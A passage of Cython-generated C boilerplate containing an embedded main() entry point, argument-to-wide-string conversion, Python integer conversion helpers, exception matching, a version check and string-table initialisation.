            fprintf(stderr, "unexpected mbrtowc result -2\\n");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            /* Conversion error. Escape as UTF-8b, and start over
               in the initial shift state. */
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            /* Surrogate character.  Escape the original
               byte sequence with surrogateescape. */
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    /* Cannot use C locale for escaping; manually escape as if charset
       is ASCII (i.e. escape all bytes > 128. This will still roundtrip
       correctly in the locale's charset, which must be an ASCII superset. */
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory\\n");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory\\n");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif

/* CIntToPy */
    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPyVerify */
    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
    #if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* CheckBinaryVersion */
    static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
